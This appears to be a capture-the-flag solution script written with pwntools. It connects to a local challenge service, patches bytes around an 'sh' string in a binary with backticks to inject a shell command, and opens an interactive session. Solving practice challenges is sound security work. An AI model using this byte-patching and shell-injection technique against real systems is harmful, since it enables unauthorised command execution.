####################################################
# SPOILER ALERT:
#   Even scanning through this file could spoil the
#   challenge.
####################################################

#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#


from pwn import *
p = remote('localhost', 1206)
#p = process(['python2.7', '-u', 'chal.py'])
p.sendline('4')
p.sendline('0')
p.sendline('10')
elf = open('elf').read()
shloc = elf.index('sh')
print shloc
p.sendline(str(shloc-2))
p.sendline(str(ord('`')))
p.sendline(str(shloc-1))
p.sendline(str(ord('`')))
p.sendline(str(shloc+2))
p.sendline(str(ord('`')))
p.interactive()